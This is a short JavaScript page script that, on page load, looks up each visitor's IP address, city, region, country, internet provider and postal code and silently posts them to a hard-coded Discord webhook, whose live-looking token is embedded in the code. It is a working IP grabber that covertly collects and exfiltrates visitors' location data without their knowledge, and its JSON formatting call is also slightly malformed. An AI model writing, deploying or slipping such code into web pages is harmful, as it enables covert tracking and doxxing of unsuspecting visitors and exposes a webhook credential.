// Function to fetch IP address and location and send to Discord
async function getIPAndLocationAndSendToDiscord() {
    try {
        const response = await fetch('http://ip-api.com/json');
        if (!response.ok) {
            throw new Error('Failed to fetch IP information');
        }
        const data = await response.json();
        
        // Construct the message with content in a code block
        const message = "```json\n" +
                        JSON.stringify({
                            "City": data.city,
                            "Region": data.regionName,
                            "Country": data.country,
                            "Internet Provider": data.org,
                            "Postal Code": data.zip,
                            "IP Address": data.query
                        , null, 2}) +
                        "\n```";
        
        // Send the message to Discord using a webhook
        await sendToDiscord(message);
    } catch (error) {
        console.error('Error fetching IP and location:', error);
    }
}

// Function to send message to Discord using webhook
async function sendToDiscord(message) {
    const webhookURL = 'https://discord.com/api/webhooks/1231897922509996093/m747ZtKM1CnTXp4o_MHXcKCnarPZ-2oyUvXMgwjrpFmmA-VMqqqj_nP7Y5VIhHKwHNsr'; // Replace YOUR_DISCORD_WEBHOOK_URL with your actual webhook URL

    try {
        // Send the message to Discord
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ content: message }),
        });
        if (!response.ok) {
            throw new Error('Failed to send message to Discord');
        }
    } catch (error) {
        console.error('Error sending message to Discord:', error);
    }
}

// Call the function to get IP address, location, and send to Discord when the page loads
window.onload = getIPAndLocationAndSendToDiscord;
